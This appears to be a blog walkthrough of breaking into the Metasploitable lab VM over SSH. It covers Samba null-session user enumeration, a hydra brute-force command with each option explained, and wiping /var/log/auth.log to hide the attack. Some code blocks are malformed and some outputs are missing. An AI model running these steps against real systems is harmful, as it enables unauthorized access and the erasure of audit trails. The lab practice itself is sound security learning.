<h1>More hacking!</h1>

<p>This is a follow up of my last post on hacking that can be read <a href="https://filimon-danopoulos.github.io/posts/2014-11-12_Metasploitable-1.html">here</a>. 
This time I will try my hands on the next service running on port 22. During this exercise I searched the web a bit and found numerous guides
on how to hack the Metasploitable machine. Since I want the excitement of finding something my self I have not read any post on the subject.
This means I might very well find sub-optimal solutions for some problems, deal with it!</p>

<h2>The target</h2>

<p>I will target the same Metasploitable VM under the exact same circumstances as last time.
Running on port 22 it has (from the previous <code>nmap</code> scan that I saved to the file <code>target</code>):</p>

<pre><code>22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
</code></pre>

<h2>Hack away!</h2>

<p>Since I have already scanned all the ports and know the version of the software I am targeting I have to find 
some kind of weakness to exploit.</p>

<h3>Searching</h3>

<p>A quick search in the Metasploit console gives me loads of hits. 
This is a partial result after I removed all irrelevant hits and cleaned up the output a bit:</p>

<pre><code>msf &gt; search ssh

<p>This is a lot to take in and at first glance nothing seems applicable as a quick exploit. So instead of wasting time going through everything
I turn to the next tool, <code>searchsploit</code>. My aim is to find an SSH exploit that is not in metasploit.</p>

</code></pre>

<p>Again nothing that seems directly applicable so I scrap the idea of finding an exploit manually. </p>

<h3>Scanning</h3>

<p>I decided to run <code>auxiliary/scanner/ssh/ssh_version</code> in order to verify that the version I found earlier is valid.</p>

<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version  
msf auxiliary(ssh_version) &gt; show options

Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting  Required  Description

   RPORT    22               yes       The target port
   THREADS  1                yes       The number of concurrent threads

RHOSTS =&gt; 192.168.56.103
msf auxiliary(ssh_version) &gt; run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>

<p>This verifies the version. Let's go to the next step!</p>

<p>At this stage I want to apply a vulnerability scanner like openvas, but I failed with the setup (didn't read the manual) and I can't 
be bothered with that since I want to get in the machine! I don't think a vulnerability scanner would add much at this stage any how.</p>

<p>Next up is a common SSH vulnerability: brute forcing, but fist...</p>

<h3>Enumeration of users</h3>

<p>I glance over the result from the metasploit search I did earlier to find something that would help with the brute forcing and see <code>auxiliary/scanner/ssh/ssh_enumusers</code>.
Having a set of valid users will really help speed up the brute forcing so I check if it is applicable (edited for brevity):</p>

<pre><code>msf &gt; info auxiliary/scanner/ssh/ssh_enumusers 

Name: SSH Username Enumeration
Module: auxiliary/scanner/ssh/ssh_enumusers
License: Metasploit Framework License (BSD)
Rank: Normal

Description:
  This module uses a time-based attack to enumerate users on an 
  OpenSSH server. On some versions of OpenSSH under some 
  configurations, OpenSSH will return a "permission denied" error for 
  an invalid user faster than for a valid user.

<p>This doesn't tell me the affected version so I check the security focus <a href="http://www.securityfocus.com/bid/20418">link</a> found under references. 
One of the affected versions is the one the target is running, sweet, let's do this!</p>

</code></pre>

<p>After running this for a while I decide to stop the scan, it's super slow and some how didn't <em>feel</em> right.
I have a hunch that this approach will fail, and that the target is not vulnerable to this attack after all.</p>

<p>I really want to target all my effort on port 22 but I can't figure out a way to enumerate the users via SSH so instead I decided to do it via a Samba vulnerability.
My target is running (from my previous scan):</p>

<pre><code>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</code></pre>

<p>I know as a fact that Samba can be missconfigured to allow null sessions so I give it a try:</p>

<pre><code># rpcclient -U "" 192.168.56.103
Enter 's password: 
rpcclient $&gt;
</code></pre>

<p>So I have a null session up and running, next is just a simple command to get all the users:</p>

<pre><code>rpcclient $&gt; enumdomusers
user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
</code></pre>

<p>And I get a list of all the users! I copy the above and create a file, open it in vim, paste the users into to it then format it to only include usernames:</p>

<pre><code># touch users.lst
# vim users.lst 
# cat users.lst | cut -d[ -f2 | cut -d] -f1 &gt; users.lst
</code></pre>

<h3>Brute forcing</h3>

<p>With this is mind I turn to my number one tool for brute forcing: <code>hydra</code>. Time to bruteforce!</p>

<pre><code># hydra -L ./users.lst -P /usr/share/john/password.lst -e nsr -t 8 -u ssh://192.168.56.103
Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only

</code></pre>

<p>Success, at this point I just cancel the scan, I have proven my point and gotten a couple of user name password combos.
Now let me exlain the <code>hydra</code> call. There are quite a lot of options to explain so the break it up.</p>

<ul>
<li><code>-L</code> defines the user name list.</li>
<li><code>-P</code> denotes a password set. I use the password list from JohnTheRipper here.</li>
<li><code>-e</code> gives any addititonal options, in this case; <code>n</code>, for <code>null</code> password; <code>s</code> for using user name as password; <code>r</code>, for using the username in reverse.</li>
<li><code>-t</code> dictates how many "tasks" should be run, defaults to 16 but has to be throtled to 8 otherwise it produces errors.</li>
<li><code>-u</code> tells hydra to apply each password to all users. This will find misconfigured (user name == password) users quicly</li>
<li>Lastly we specify the actual target, in this case the protocol is defined as part of the URI.</li>
</ul>

<p>Next we try to login to the machine via SSH:</p>

<pre><code># ssh msfadmin@192.168.56.103

<h3>Clean up</h3>

<p>So I have a user, a password and I can launch stuff as root! One of the things I have to do know is clear some of my tracks.
The file <code>/var/log/auth.log</code> will include a huge amount of information about our SSH enumeration attempt and brute force attack, 
the lazy way to clean it is just remove everything. This just covers the how but not the fact the machine was compromised.</p>

<pre><code># grep 'sshd' /var/log/auth.log | wc -l
26659
# echo "" &gt;  /var/log/auth.log
</code></pre>

<p>Here we can see that we have almost 27000 log entries related too SSH, after we wipe it nothing of that will remain. 
The elegant solution would be to just remove all the entries that our brute force attack created, but I can't be bothered at this stage since I have been at it for a while now.</p>

<h3>Summary</h3>

<p>This was a lot harder than the port 21 hack but still not impossible. I made a clear mistake trying to enumerate the SSH user and should have gone
for the Samba vulnerability right away. I was a bit to focused to do this port by port for the heck of it, but that is not how pentesting works.
I had a wealth of information and available (and a root shell) from previous activity, so I wanted to put some restrictions on my self but had to break them.</p>

<p>Hopefully the next hack will not be as long a write up as this one!</p>
